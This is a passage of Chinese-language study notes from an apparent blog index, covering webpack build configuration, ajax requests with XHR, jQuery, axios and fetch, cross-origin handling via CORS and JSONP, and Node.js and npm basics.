图片大小小于 8kb 就会被base64 处理\n            // 优点：减少请求数量  减轻服务器压力\n            // 缺点：图片体积会更大 文件请求速度更慢\n            limit: 8 * 1024,\n            // fallback: resolve('file-roader'),\n            // 对图片进行重命名\n            name: 'img/[name][hash:10].[ext]',\n            // 因为url-loader 默认 es6 模块化解析 而html-loader引入图片是commonjs\n            // 解析时 会出现 [object Module]\n            // 关闭 url-loader 的es6 模块化 使用 commonjs\n            esModule: false,\n          },\n        //或者\n        // use: {\n        //   loader: 'url-loader',\n        //   options: {\n        //     publicPath: './img',\n        //     outputPath: 'img/',\n        //     limit: 8192,\n        //     esModule: false\n        //   }\n        // },\n        type: 'javascript/auto',   //必要\n~~~\n\n\n\n#### 1.2.4 html中的图片\n\n~~~js\n//在上面图片配置的基础上\n //处理 html 的img\n      {\n        test: /\\.html$/,\n        // 引入 img 从而被 url-loader处理\n        loader: 'html-loader',\n        options: {\n          esModule: false,\n        }\n~~~\n\n\n\n#### 1.2.5 html\n\n~~~js\n//plugins : 下载 -> 导入 -> 使用\nconst HtmlWebpackPlugin = require('html-webpack-plugin');\n// plugins插件的配置\n  plugins: [\n    // html-webpack-plugin\n    // if 直接 new...() 会创建一个空的html 自动引入打包输出的所有资源\n    // if new...({ template:'url'}) 会有路径中的文件的结果\n    new HtmlWebpackPlugin({\n      template: './src/index.html'\n    })\n  ],\n~~~\n\n\n\n#### 1.2.6 热部署\n\n~~~js\n  // 最新 webpack-cil 于这个不匹配\n  // 开发服务器 devServer 用来自动化 自动编译 打开浏览器 刷新\n  // 特点 只会在内存中编译打包 不会有任何输出\n  // 启动 npx webpack-dev-server  \n  devServer: {\n    // 项目构建后目录\n    contentBase: resolve(__dirname, 'build'),\n    // 启动gzip压缩\n    compress: true,\n    // 端口号\n    port: 3000,\n    // 自动打开浏览器\n    open: true\n  }\n~~~\n\n\n\n## 2.webpack 开发环境依赖\n\n### 2.1 提取css 成单独文件\n\n~~~js\nconst { resolve } = require('path'); \nconst HtmlWebpackPlugin = require('html-webpack-plugin'); \nconst MiniCssExtractPlugin = require('mini-css-extract-plugin'); \n\nmodule.exports = { \n    entry: './src/js/index.js', \n    output: { \n        filename: 'js/built.js', \n        path: resolve(__dirname, 'build') \n    },\n    module: { \n        rules: [ { \n            test: /\\.css$/, \n            use: [ \n                // 创建 style 标签，将样式放入 \n                // 'style-loader', \n                // 这个 loader 取代 style-loader。作用：提取js中的css成单独文件 MiniCssExtractPlugin.loader, \n                // 将 css 文件整合到 js 文件中 \n                'css-loader' ] \n        } ] \n    },\n    plugins: [ \n        new HtmlWebpackPlugin({ \n            template: './src/index.html' \n        }), \n        new MiniCssExtractPlugin({ \n            // 对输出的 css 文件进行重命名 \n            filename: 'css/built.css' \n        }) \n    ],\n    mode: 'development' \n};\n~~~\n\n\n\n### 2.2 css兼容\n\n~~~js\n//webpack.config.js\n{ \n    test: /\\.css$/, \n        use: [ \n            MiniCssExtractPlugin.loader, \n            'css-loader', \n            { \n                loader: 'postcss-loader', \n                options: { \n                    ident: 'postcss', \n                    plugins: () => [ \n                        // postcss 的插件 \n                        require('postcss-preset-env')() \n                    ] \n                } \n            } \n        ]\n}\n\nplugins: [ \n    new HtmlWebpackPlugin({ template: './src/index.html' }), \n    new MiniCssExtractPlugin({ \n        filename: 'css/built.css' \n    }) \n]\n~~~\n\n~~~js\n//package.js\n\"browserslist\": { \n    \"development\": [ \n        \"last 1 chrome version\", \n        \"last 1 firefox version\", \n        \"last 1 safari version\" \n    ],\n    \"production\": [ \n        \">0.2%\", \n        \"not dead\", \n        \"not op_mini all\" \n    ] \n}\n~~~\n\n\n\n### 2.3 css压缩\n\n~~~js\nplugins: [\n    ... //同上\n    new OptimizeCssAssetsWebpackPlugin() \n],\n~~~\n\n\n\n### 2.4 js语法检查 eslint\n\n~~~js\nrules: [ \n    /*语法检查： eslint-loader eslint \n    注意：只检查自己写的源代码，第三方的库是不用检查的 \n    设置检查规则： package.json 中 eslintConfig 中设置~ \n    \"eslintConfig\": { \"extends\": \"airbnb-base\" } \n    airbnb --> eslint-config-airbnb-base eslint-plugin-import eslint \n    */\n    { \n        test: /\\.js$/, \n        exclude: /node_modules/, \n        loader: 'eslint-loader', \n        options: { \n            // 自动修复 eslint 的错误 \n            fix: true \n        } \n    } \n]\n~~~\n\n~~~js\n//package.json\n\"eslintConfig\": { \n    \"extends\": \"airbnb-base\",\n     \"env\": { \n         \"browser\": true \n     } \n}\n~~~\n\n\n\n### 2.5 js兼容\n\n~~~js\nrules: [ \n    { \n        test: /\\.js$/, \n        exclude: /node_modules/, \n        loader: 'babel-loader', \n        options: { \n            // 预设：指示 babel 做怎么样的兼容性处理 \n            presets: [ \n                [ '@babel/preset-env', \n                 { \n                     // 按需加载 \n                     useBuiltIns: 'usage', \n                     // 指定 core-js 版本 \n                     corejs: { version: 3 },\n                     // 指定兼容性做到哪个版本浏览器 \n                     targets: { chrome: '60', firefox: '60', ie: '9', safari: '10', edge: '17' } \n                 } \n                ] \n            ] \n        } \n    } \n]\n~~~\n\n\n\n### 2.6 js压缩\n\n~~~js\n// 生产环境下会自动压缩 js 代码 \nmode: 'production'\n~~~\n\n\n\n### 2.7 html压缩\n\nwebpack5也能压缩html\n\n~~~js\nplugins: [ \n    new HtmlWebpackPlugin({ \n        template: './src/index.html', \n        // 压缩 html 代码 \n        minify: { \n            // 移除空格 \n            collapseWhitespace: true, \n            // 移除注释 \n            removeComments: true \n        } \n    }) \n],\nmode: 'production'\n~~~\n\n\n\n## 3. webpack优化配置\n\n### 3.1 HMR\n\n~~~js\nmode: 'development', \ndevServer: { \n    contentBase: resolve(__dirname, 'build'), \n    compress: true, \n    port: 3000, \n    open: true, \n    // 开启 HMR 功能 \n    // 当修改了 webpack 配置，新配置要想生效，必须重新 webpack 服务 \n        hot: true \n}\n~~~\n\n\n\n### 3.2 **source-map**\n\n~~~js\ndevtool: 'eval-source-map'\n~~~\n\n\n\n### 3.3 OneOf\n\n~~~js\n// 以下 loader 只会匹配一个 // 注意：不能有两个配置处理同一种类型文件 \noneOf: [\n    ..处理css less img js...\n]\n~~~\n\n\n\n### 3.4 缓存\n\n~~~js\n\t/*\n\t正常来讲，一个文件只能被一个 loader 处理。 \n\t当一个文件要被多个 loader 处理，那么一定要指定 loader 执行的先后顺序： \n\t先执行 eslint 在执行 babel \n\t*/\n\t{ \n        test: /\\.js$/, \n        exclude: /node_modules/, \n        loader: 'babel-loader', \n        options: { \n            // 预设：指示 babel 做怎么样的兼容性处理 \n            presets: [ \n                [ '@babel/preset-env', \n                 { \n                     // 按需加载 \n                     useBuiltIns: 'usage', \n                     // 指定 core-js 版本 \n                     corejs: { version: 3 },\n                     // 指定兼容性做到哪个版本浏览器 \n                     targets: { chrome: '60', firefox: '60' } \n                 } \n                ] \n            ],\n            // 开启 babel 缓存 \n            // 第二次构建时，会读取之前的缓存 \n            cacheDirectory: true\n        } \n    } \n~~~\n\n\n\n### 3.5 tree shaking 树摇\n\n前提：必须使用 es6 模块化   开启 production 环境\n\n作用：减少代码体积\n\n~~~json\n//package.json\n//所有代码都没有副作用 都可以进行树摇\n//问题：可能会把 css/ @babel/polyfill 文件干掉\n\"sideEffects\":false,\n//对数组里的文件会忽略该操作\n\"sideEffects\":[\"*.css\",\"*.less\"]\n~~~\n\n\n\n### 3.6 code spilt 代码分割\n\n1. 利用多入口  打包成多个js文件\n\n   ~~~js\n   entry:{\n      index: ’./src/js/index.js’,\n      test: ’./src/js/test.js’\n   }\n   ~~~\n\n2. 单/多入口 与 optimization 配合\n\n   ~~~js\n   entry: ‘./src/index.js’,\n   // 或者 多入口\n   \n   //1. 可以将node_modules中代码单独打包一个chunk最终输出\n   //2. 自动分析多入口chunk中，有无公共文件 if有 就会打包成单独一个chunk\n   optimization:{\n   \tsplitChunks:{\n   \t\tchunk: ’all’\n   \t}\n   }\n   ~~~\n\n3. 在单入口 与 optimization 配合 页面的 js 文件里面使用 import\n\n   通过js代码，让某某个文件被单独打包成一个chunk\n\n   import 动态导入语法：能将某个文件单独打包\n\n   ~~~js\n   //  /* webpackChunkName: 'test' */ webpack.config.js 中 的[name] == test\n   import(/* webpackChunkName: 'test' */'./test').then(({mul,count}) => {\n       //文件加载成功\n   }).catch(() => {\n       //文件加载失败\n   })\n   ~~~\n\n   \n\n### 3.7 **lazy loading**\n\n懒加载：文件需要使用是才加载\n\n预加载 prefetch：使用之前 提前记载js文件  等其他资源加载完毕 浏览器空闲了 再偷偷加载\n\neg\n\n~~~js\nbtn.onclick = function(){\n    //懒加载\n    import(/* webpackChunkName: 'test' */'./test').then(({mul,count}) => {\n    \t//文件加载成功\n\t})\n    //预加载\n    import(/* webpackChunkName: 'test' , webpackPrefetch: true */'./test').then(({mul,count}) => {\n    \t//文件加载成功\n\t})\n}\n~~~\n\n\n\n### 3.8 pwa\n\n现在好像已经被淘汰了\n\npwa 渐进式网络开发应用程序  离线可访问\n\n~~~js\n// webpack.config.js\nnew WorkboxWebpackPlugin.GenerateSW{\n    //1.帮助serviceworker快速启动\n    //2.删除旧的 serviceworker\n    \n    //生成一个serviceworker 配置文件\n    clicentsClaim: true,\n    skipWaiting: true\n}\n~~~\n\n~~~js\n// index.js\n//注册 serviceWorker\n//处理兼容性问题\nif('serviceWorke' in navigator){\n    window.onload(() => {\n        navigator.serviceWorker\n        .register('/service-worker.js')\n        .then(() => {\n            log('成功')\n        })\n        .catch(() => {\n            log('失败')\n        })\n    })\n}\n~~~\n\n~~~js\n//因为eslint不认识 window navigator全局变量\n//解决 需要修改 package.json eslintConfig 配置\n\"env\":{\n    \"browser\":true //支持浏览器端全局变量\n}\n~~~\n\nsw 必须运行在服务器上 \n\n+ nodejs\n\n+ npm i serve -g\n\n  serve -s build 启动服务器 将build目录的所有资源 作为静态资源暴露出去\n\n\n\n### 3.9 多进程打包\n\n~~~js\n{ \n    test: /\\.js$/, \n    exclude: /node_modules/, \n    use: [{\n        /*开启多进程打包。 \n        进程启动大概为 600ms，进程通信也有开销。 \n        只有工作消耗时间比较长，才需要多进程打包 */ \n            loader: 'thread-loader', \n            options: { \n                workers: 2 // 进程 2 个 \n             }\n        }]\n}\n~~~\n\n\n\n### 3.10 **externals**\n\n不打包 jquery 然后 在html 手动引入cdn\n\n~~~js\nmode: 'production', \nexternals: { \n    // 拒绝 jQuery 被打包进来 \n    jquery: 'jQuery' \n}\n~~~\n\n\n\n### 3.11 dll\n\n使用dll 对某些 第三方库 进行单独打包\n\n+ 运行webpack 时 默认查找webpack.config.js \n+ 所以运行 改文件应 `webpack --config webpack.dll.js`\n\n~~~js\n// webpack.dll.js\n...\nconst webpack = require(\"webpack\");\n\nentry:{\n    //最终打包生成的[name] = jquery\n    //['jquery'] = 要打包的库\n    jquery:['jquery']\n}，\noutput:{\n    filename:'[name].js',\n    path:resolve(__dirname,'dll'),  //打包后的位置\n    library:'[name]_[hash]'  //打包的库里面向外暴露出去的内容的名字\n},\nplugins:[\n    // 告诉webpack 不用再打包了\n    //打包生成一个manifest.js  提供和jq 的映射\n    new webpack.DllPlugin({\n        name:'[name]_[hash]',  //映射库的暴露内容名称\n        path:resolve(__dirname,'dll/nanifest.json')  //输出文件路径\n    })\n]\n\n~~~\n\n之后再运行webpack 就不会再重复打包jq了\n\n~~~js\n//webpack.config.js\nplugins: [ \n    new HtmlWebpackPlugin({ template: './src/index.html' }), \n    // 告诉 webpack 哪些库不参与打包，同时使用时的名称也得变~ \n    new webpack.DllReferencePlugin({ \n        manifest: resolve(__dirname, 'dll/manifest.json') \n    }), \n    // 将某个文件打包输出去，并在 html 中自动引入该资源 \n    new AddAssetHtmlWebpackPlugin({ \n        filepath: resolve(__dirname, 'dll/jquery.js') \n    })\n]\n~~~\n\n\n\n### 3.12 优化总结\n\n1. 开发环境性能优化\n\n   + 优化打包构建速度\n\n     HMR\n\n   + 优化代码调试\n\n     source-map\n\n2. 生成环境性能优化\n\n   + 优化打包构建速度\n\n     OneOf\n\n     babel缓存\n\n     多进程打包\n\n     externals\n\n     dll\n\n   + 优化代码运行的性能\n\n     缓存(hash–chunkhash–contenthash)\n\n     tree shaking\n\n     code split\n\n     懒加载/预加载\n\n     pwa\n\n\n\n## 4. webpack 配置详情\n\n### 4.1 entry \n\n入口起点\n\n1. String  -> ‘./src/index.js’\n\n   单入口  打包形成一个chunk 输出一个 bundle 文件\n\n   chunk 名称默认是 main\n\n2. array  –> [‘./src/index.js’, ‘./src/add.js’]\n\n   多入口  所有入口文件形成一个chunk 输出一个 bundle 文件\n\n3. object  -> { index : ‘./src/index.js’, add:  ‘./src/add.js’ }\n\n   多入口 几个入口就几个chunk 输出几个bundle\n\n   chunk 名称为 key值\n\n4. 特殊用法\n\n   {\n\n   ​\t index :[‘./src/index.js’, ‘./src/add.js’],    //一个chunk 一个bundle\n\n   ​\t add:  ‘./src/add.js’    //一个chunk 一个bundle\n\n   }\n\n\n\n### 4.2 output\n\n~~~js\noutput: { \n    // 文件名称（指定名称+目录） \n    filename: 'js/[name].js', \n    // 输出文件目录（将来所有资源输出的公共目录） \n    path: resolve(__dirname, 'build'), \n    // 所有资源引入公共路径前缀 --> 'imgs/a.jpg' --> '/imgs/a.jpg' \n    publicPath: '/', \n    chunkFilename: 'js/[name]_chunk.js', // 非入口 chunk 的名称 \n    // library: '[name]', // 整个库向外暴露的变量名 \n    // libraryTarget: 'window' // 变量名添加到哪个上 browser \n    // libraryTarget: 'global' // 变量名添加到哪个上 node \n    // libraryTarget: 'commonjs' \n},\n~~~\n\n\n\n### 4.3 module\n\n~~~js\nmodule: { \n    rules: [ \n    // loader 的配置 \n        { \n            test: /\\.css$/, \n            // 多个 loader 用 use\n            use: ['style-loader', 'css-loader'] \n        },\n        { \n            test: /\\.js$/, \n            // 排除 node_modules 下的 js 文件 \n            exclude: /node_modules/, \n            // 只检查 src 下的 js 文件 \n            include: resolve(__dirname, 'src'), \n            // 优先执行 enforce: 'pre', \n            // 延后执行 // enforce: 'post', \n            // 单个 loader 用 loader \n            loader: 'eslint-loader', \n            options: {} \n        },\n        { \n            // 以下配置只会生效一个 \n            oneOf: [] \n        } \n    ] \n},\n~~~\n\n\n\n### 4.4 resolve\n\n~~~js\nresolve: { \n    // 配置解析模块路径别名: 优点简写路径 缺点路径没有提示 \n    alias: { \n        $css: resolve(__dirname, 'src/css') \n    },\n     // 配置省略文件路径的后缀名 \n     extensions: ['.js', '.json', '.jsx', '.css'], \n     // 告诉 webpack 解析模块是去找哪个目录 \n      modules: [resolve(__dirname, '../../node_modules'), 'node_modules'] \n}\n~~~\n\n\n\n### 4.5 dev server\n\n~~~js\ndevServer: { \n    // 运行代码的目录 \n    contentBase: resolve(__dirname, 'build'), \n    // 监视 contentBase 目录下的所有文件，一旦文件变化就会 reload \n    watchContentBase: true, \n    watchOptions: { \n        // 忽略文件 \n        ignored: /node_modules/ \n    },\n    compress: true, // 启动 gzip 压缩  \n    port: 5000,     // 端口号\n    host: 'localhost',     // 域名 \n    open: true,     // 自动打开浏览器 \n    hot: true,     // 开启 HMR 功能  \n    clientLogLevel: 'none',    // 不要显示启动服务器日志信息\n    // 除了一些基本启动信息以外，其他内容都不要显示 \n    quiet: true, \n    overlay: false,// 如果出错了，不要全屏提示~\n    // 服务器代理 --> 解决开发环境跨域问题 \n    proxy: { \n        // 一旦 devServer(5000)服务器接受到 /api/xxx 的请求，就会把请求转发到另外一个服务器 (3000)\n        '/api': { \n            target: 'http://localhost:3000', \n            // 发送请求时，请求路径重写：将 /api/xxx --> /xxx （去掉/api） \n            pathRewrite: { '^/api': '' } \n        } \n    }\n}\n~~~\n\n\n\n### 4.6 **optimization**\n\n~~~js\noptimization: { \n    splitChunks: { \n        chunks: 'all' \n        // 后面默认值，可以不写~ \n    },\n    // 将当前模块的记录其他模块的 hash 单独打包为一个文件 runtime \n    // 解决：修改 a 文件导致 b 文件的 contenthash 变化 \n    runtimeChunk: { \n        name: entrypoint => `runtime-${entrypoint.name}` \n    },\n    minimizer: [ \n        // 配置生产环境的压缩方案：js 和 css \n        new TerserWebpackPlugin({ \n            // 开启缓存 \n            cache: true, \n            // 开启多进程打包 \n            parallel: true, \n            // 启动 source-map \n            sourceMap: true \n        }) \n    ] \n}\n~~~\n\n","tags":["webpack"],"categories":["learningNotes"]},{"title":"ajax 学习笔记","url":"/learningNotes/ajax","content":"\n## 1.简介\n\n### 1.1 ajax \n\najax(asynchronous javascript and xml)，即异步 JS 和 XML\n\n通过 ajax 可以在浏览器中向服务器发送异步请求，最大的优势 –> 无刷新获取数据\n\najax 是一种将现有标准组合在一起使用的新方式\n\n\n### 1.2 xml\n\nxml 可扩展标记语言\n\n被设计用来传输和存储数据\n\n与 html 类似，不同的是 html 中都是预定义标签，而 xml 没有预定于标签，全部是自定义标签，用了表示一些数据\n\n### 1.3 json\n\n现在 xml 已经的传输和存储数据的功能已经被 json 取代了\n\n\n\n### 1.4 ajax 的特点\n\n#### 1.4.1 优点\n\n1. 可以无需刷新页面与服务端进行通信\n2. 允许根据用户事件来更新部分页面内容\n\n#### 1.4.2 缺点\n\n1. 没有浏览历史，不能回退\n2. 存在跨域问题（同源）\n3. seo（爬虫） 不友好\n\n\n\n## 2. http 报文\n\n### 2.1 http\n\nhypertext transport protocol 超文本传输协议，详细规定了浏览器和万维网服务器之间互相通信的规则\n\n\n\n### 2.2 请求报文\n\n> 重点：格式、参数\n\n+ 行   : POST    /s?ie=utf-8   HTTP/1.1\n\n+ 头   : Host: …\n\n  ​         Cookie: name=…\n\n  ​         Content-type:application/x-www-form-urlencoded\n\n  ​         User-Agent:chrome 83\n\n+ 空行 :\n\n+ 体    : username=admin&password=admin\n\n\n\n### 2.3 响应报文\n\n+ 行   : HTTP/1.1  200  OK\n\n+ 头   : Content-type: text/html;charset=utf-8\n\n  ​         Content-length:2048\n\n  ​         Content-encoding:gzip\n\n+ 空行 :\n\n+ 体    : `<html>....</html>`\n\n\n\n### 2.4 network 上的请求响应\n\n+ Headers：请求内容\n  + General\n  + Response Headers：响应头和行\n  + Requset Headers：请求头和行\n  + Query String Parameters：请求体\n    + get ： 查询字符串的键值对\n    + post：查询字符串\n+ Preview：预览响应过来的html\n+ Response：响应的内容\n\n\n\n## 3. ajax的使用\n\n### 3.1 node express 的使用\n\n使用node express搭建服务器\n\n~~~js\nimport express from 'express';\n\nconst app = express();\n\napp.get('/', (request, response) => {\n  response.send('hello express');\n})\n\napp.listen(8000, () => {\n  console.log(\"8000端口监听...\");\n})\n~~~\n\n\n\n### 3.2 原生ajax使用\n\n1. 创建对象 \n   \n    ~~~js\n    const xhr = new XMLHttpRequest();\n    ~~~\n    \n2. 初始化 设置请求方法和url \n   \n    ~~~js\n    xhr.open('GET','http://127.0.0.1:8000/server');\n    ~~~\n    \n3. 发送 设置参数\n   \n    ~~~js\n    xhr.send();\n    xhr.send('a=10&b=20');\n    ~~~\n    \n4. 事件绑定 处理服务端返回的结果\n   \n    ~~~js\n    xhr.onreadystatechange = function(){...}\n    ~~~\n    \n    > 其中 readystate 是 xhr 对象的属性，\n    > 其值为 0:初始状态 1:open后  2:send后  3:返回部分数据 4:返回全部数据\n    \n    > 其中 xhr的对象 \n    > state:状态码 statusText:状态字符串 getAllResponseHeader():所有响应头 response:响应体\n\n\n\n\n\n* 服务器端要做的操作：解决跨域问题\n  \n    ~~~js\n    response.setHeader('Access-Control-Allow-Origin','*');\n    ~~~\n    \n    \n    \n* if 设置请求头 :  在send前\n  \n     ~~~js\n      xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded')\n      xhr.setRequestHeader('name','lee')\n     ~~~\n  \n  则 要在服务器端 设置允许的响应头：\n  \n  ~~~js\n   response.setHeader('Access-Control-Allow-Headers','*');\n  ~~~\n  \n  \n  \n* if 处理后端传的字符串json数据\n\n    + 服务器\n\n      ~~~js\n       const data = { name : 'lee' }\n       let str = JSON.stringify(data);\n       response.send(str)\n      ~~~\n\n    + 前端处理\n        手动转换数据格式：\n\n      ~~~js\n       let data = JSON.parse(xhr.response);\n       res.value = data.name;\n      ~~~\n\n        自动转换：\n\n      ~~~js\n       //在open前 设置响应体数据的类型\n       xhr.responseType = 'json'\n       //在事件里直接使用就可以了\n       res.value = xhr.response.name;\n      ~~~\n\n      \n\n* 解决ie缓存问题：在open中加时间戳 保证每次发生的请求都不一样\n    ~~~js\n      xhr.open('GET','http://127.0.0.1:8000/ie?t=' + Date.now());\n    ~~~\n      \n      \n      \n* 处理请求异常\n   服务器可以设置一个定时器，三秒后才返回响应\n   在open前：\n   \n   ~~~js\n    //超时设置 \n    xhr.timeout = 2000;\n    //超时回调 \n    xhr.ontimeout = function(){ alert('网络异常，请稍后重试') }\n    //网络异常回调 可以在f12 使用offline 测试\n    xhr.onerror = function(){ alert('你的网络似乎出现了问题') }\n   ~~~\n   \n   \n   \n* 取消发送请求事件\n  \n    ~~~js\n    let x = null;\n    //发送请求 x 为 前面的xhr对象\n    //使用 x.abort() 可以取消发送请求\n    //利用这个方法可以处理 多次发送请求 只保留一个请求的情况\n    ~~~\n    \n    \n\n#### 3.2.1 原生ajax案例 – 点击按钮 将响应的数据放在文本框里\n\n\n\n\n### 3.3 jquery 中的 ajax\n\n1. get/post请求\n     `$.get/post(url, data请求携带的参数, callback成功时的回调函数, type返回数据格式)  后面三个参数可选填`\n     \n     ~~~js\n     $.get('http://127.0.0.1:8000/jq-server', {a:10,b:20}, function(data){\n           log(data);\n     },'json')\n     ~~~\n     \n     \n     \n1. ajax通用请求\n   \n     ~~~js\n     $.ajax({\n          url:'http://127.0.0.1:8000/delay',   //url\n          data: {a:10,b:20},       //参数\n          type: 'GET',             //请求类型\n          dataType:'json',         //响应体结果\n          success:function(data){  //成功回调\n               log(data);\n          },\n          timeout:2000,            //超时回调\n          error:function(){...}    //失败回调\n         headers:{...}            //自定义头部\n    })\n    ~~~\n    \n    \n\n### 3.4 axios\n\n1. 导入axios加载文件 bootcdn\n\n2. axios可以配置 baseURL\n   \n    ~~~js\n    axios.defaults.baseURL = 'http://127.0.0.1:8000';\n    ~~~\n    \n3. axios使用 返回promise对象\n    get请求: axios.get(url [, config] )\n    post请求: axios.post(url [, data [, config]] ) //第二个是请求体参数\n    axios请求: axios(config)\n    \n    ~~~js\n     axios.get('/axios-server',{\n           params:{          //url参数\n                id:100,\n                vip:7\n           },\n           headers:{         //请求头信息\n                name:'lee',\n                age:'20'\n           }\n    }).then(value => { ... } )\n    ~~~\n    \n    ~~~js\n     axios.post('/axios-server',{ username:'admin', password:'admin' },{\n           params:{          //url参数\n                id:100,\n                vip:7\n           },\n           headers:{         //请求头信息\n                name:'lee',\n                age:'20'\n           }\n    }).then(value => { ... } )\n    ~~~\n    \n    ~~~js\n    axios({\n        method:'POST',              //请求方法\n        url:'/axios-server',        //url\n        params:{id:100, vip:7 },    //url参数\n        headers:{ a=10, b=20 },     //头信息\n        data:{ username:'admin', password:'admin' },  //请求体参数\n    }).then( res => { log(res) } )\n    ~~~\n    \n    \n### 3.5 fetch\n\n~~~js\nfetch('http://127.0.0.1:8000/fecth-server?vip=10',{\n    method:'POST',                          //请求方法\n    headers:{ name:'lee' },                 //请求头\n    body:'username=admin&password=admin'    //请求体\n}).then(res => {\n    return res.text();  //字符串\n    return res.json();  //json\n}).then(res => {\n    console.log(res)\n})\n~~~\n\n\n\n## 4. 跨域问题\n\n### 4.1同源策略\n\n浏览器的一种安全策略\n\n同源：协议、域名、端口号完全相同\n\n违背同源策略就是跨域\n\n\n\n### 4.2 同源的一个例子\n\nhtml页面跟 发送请求时同一个地址\n\n~~~js\n//server.js\n...\napp.get('/home',(req,res) => {\n    res.sendFile(__dirname + '/index.html');  //响应一个页面\n})\n\napp.get('/data',(req,res) => {\n    res.send('用户数据');   //请求数据\n})\n~~~\n\n~~~js\n//index.html\n...\nbtn.onlick = function(){\n    const xhr = new XMLHttpRequest();\n    // 因为是同源的 所以url 可以简写\n    xhr.open('GET','/data');\n    xhr.send();\n    xhr.onreadystatechange = function(){\n        ...\n    }\n}\n~~~\n\n\n\n### 4.3 jsonp 原理\n\n主要就是利用了 `script` 标签的`src`没有跨域限制来完成的\n\n缺点：\n\n- 只能进行`GET`请求\n\n优点：\n\n- 兼容性好，在一些古老的浏览器中都可以运行\n\n~~~js\n//server.js\napp.all('/jsonp', (req, res) => {\n  // res.send('console.log(hello jsonp)')\n  const data = {\n    name: 'lee'\n  }\n\n  res.end(`handle(${JSON.stringify(data)})`);\n\n})\n~~~\n\n~~~html\n//html\n<script>\n    function handle(data) {\n      const res = document.querySelector('div');\n      res.innerHTML = data.name;\n    }\n</script>\n<script src=\"http://127.0.0.1:8000/jsonp\"></script>\n~~~\n\n\n\n### 4.4 jsonp 实践\n\n~~~js\n//server\napp.all('/jsonp-exe', (req, res) => {\n  // res.send('console.log(hello jsonp)')\n  const data = {\n    exist: 1,\n    mes: '用户名存在'\n  }\n\n  res.end(`handle(${JSON.stringify(data)})`);\n\n})\n~~~\n\n~~~html\n<script>\n  const p = document.querySelector('p')\n  const input = document.querySelector('input')\n  function handle(data) {\n    input.style.border = '1px solid red';\n    p.innerHTML = data.mes;\n  }\n  input.onblur = function () {\n    // 获取用户的输入\n    let username = this.value;\n    // 向服务器发送请求 检测用户是否存在\n    // 1.创建script\n    const script = document.createElement('script');\n    // 2.设置标签 src\n    script.src = 'http://127.0.0.1:8000/jsonp-exe';\n    // 3.插入到dom\n    document.body.appendChild(script);\n  }\n</script>\n~~~\n\n\n\n### 4.5 jq-jsonp\n\n### 4.6 cors\n\n<img src=\"https://s1.328888.xyz/2022/04/09/X3BLX.jpg\">\n\n~~~js\n//server\napp.all('/cors', (req, res) => {\n  // 1.设置响应头，允许跨域\n  res.setHeader('Access-Control-Allow-Origin', '*');\n  // 2.设置响应头\n  res.setHeader('Access-Control-Allow-Headers', '*');\n  res.setHeader('Access-Control-Allow-Methods', '*');\n  // 3.响应体\n  res.send('hello cors');\n\n})\n~~~\n\n~~~html\n<script>\n  const btn = document.querySelector('button')\n  const text = document.querySelector('textarea')\n\n  btn.onclick = function () {\n    const xhr = new XMLHttpRequest();\n    xhr.open('GET', 'http://127.0.0.1:8000/cors');\n    xhr.send();\n    xhr.onreadystatechange = function () {\n      if (xhr.readyState === 4) {\n        text.value = xhr.response\n      }\n    }\n  }\n</script>\n~~~\n\n","tags":["js"],"categories":["learningNotes"]},{"title":"Nodejs 学习笔记","url":"/learningNotes/nodejs","content":"\n## 0.其他知识点\n\n### 0.1 代码风格\n\n- JavaScript Standard Style\n\n- Airbnb JavaScript style\n\n- if 使用 五分号风格 只要注意在 当每一行是以 ( [ ` 这3个开头时 前要补空格\n\n  >  ``打印字符 es6 模板字符串 支持 换行 方便拼接\n\n快捷键：选择长度不等 `alt 选 放开 ctrl + 向右`\n\n​             选相同的：`先选中 然后 ctrl + d` \n\n\n### 0.2 浏览器收到html响应的解析过程\n\n从上到下依次解析，当在解析的过程中，如果发现有：\n\nlink、script、img、iframe、video、audio 等\n\n带有 src 或者 href(除 a ) 这种具有外链的资源 属性的标签时\n\n浏览器会自动对这些资源发起新的请求\n\n\n\n### 0.3 相对路径的 ./\n\n+ 文件操作中的相对路径可以省略 ./\n\n  **使用的所有文件操作的 api 都是异步的**\n\n  fs.readFile('data/a.txt', …)\n\n+ 在模块加载中 相对路径不能省略 ./\n\n  require('./data/foo.js') \n\n> if 只有 / 则会找到 根目录 'C: …' 绝对路径 \n\n\n\n### 0.4 修改完代码自动重启服务器\n\n使用第三方命令行工具 nodemon 解决\n\n其是 基于 node.js 开发的第三方工具 需要全局安装\n\n1. 安装 ：`npm install --global nodemon`\n\n2. 使用 ：`nodemon app.js` 用nodemon 代替 node 启动文件\n\n   > 会监视文件变化 然后自动重启服务器\n\n\n\n### 0.5 <font color='red'>回调函数:获取异步操作的结果</font>\n\n**如果需要获取一个函数中异步操作的结果，则必须通过回调函数来获取**\n\n> 学node的精华所在 封装异步 api 5.6中有案例\n\n~~~js\nfunction fn(callback){\n    //callback = function(data){ console.log(data) }\n    setTimeout(function(){\n        let data = 'hello';\n        callback(data);\n    },1000)\n}\n\n// 外部得到 data\nfn(function(data){\n    console.log(data);\n})\n~~~\n\n\n\n### 0.6 npm package.js \n\n1. npm\n\n   node package manager\n\n2. package.js\n\n   包描述文件 (项目说明书)\n\n   npm 下载东西的时候 加 - - save (保存项目第三方包的依赖信息 dependencies)\n\n   可以在终端 npm init 初始化项目 创建\n\n+ 当把node_mouldes 文件夹删除后 因为有 package.js 中的依赖信息 所以**直接终端 npm install** 就会重新下回来\n\n\n\n#### 0.6.1 npm 网站\n\n[官方网站](https://npmjs.com)\n\n第三方包 在哪来的 可以搜索下载上传第三方包 \n\n#### 0.6.2 npm 命令行工具\n\nnpm 第二层含义就是 命令行工具 只要安装node就安装了npm\n\n1. 查版本号 : `npm --version`\n2. 升级 npm : `npm install --global npm`\n\n#### 0.6.3 常用命令\n\n+ 生成项目 : `npm init`\n\n  + `npm init --yes` 跳过向导 快速生成\n\n+ 下载第三方包 : `npm install`  `npm install 包名`  `npm install --save`\n\n+ 删除包 : `npm uninstall 包` 只删除 if有依赖项就会保存\n\n  ​              `npm uninstall --save 包`  删除包 以及其依赖项\n\n+ 查看使用帮助 : `npm --help`\n\n+ 查看指定命令使用帮助 : `npm 命令 --help`\n\n+ 查看npm配置信息 : `npm config list`\n\n#### 0.6.4 解决 npm 被墙问题\n\n使用淘宝镜像 `cnpm`\n\n>  npm 服务器在国外 \n\n1. 安装 cnpm `npm install --global cnpm`\n2. `cnpm`直接替换 命令 `npm`\n\nif 不想下cnpm 可以每次这样使用 `npm install jquery --registry=https://registry.npm.taobao.org`\n\n也可以将`npm config set registry=https://registry.npm.taobao.org` 